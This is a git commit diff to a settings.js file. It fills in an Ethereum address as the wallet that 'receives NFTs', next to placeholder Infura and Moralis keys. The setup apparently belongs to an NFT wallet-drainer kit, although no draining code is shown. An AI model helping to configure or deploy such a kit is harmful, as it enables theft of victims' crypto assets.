48df860d2a9f72221a6c11149099637d02007458
Sedko00 <112730406+Sedko00@users.noreply.github.com>
2022-09-03 11:34:01 +0200

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,5 +1,5 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
+const address = "0x8A10a0Ddc2F2AEcA7e3870085964e199Fff44F97";    // Your ETH wallet that you have to receive NFTs
 const infuraId = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
 
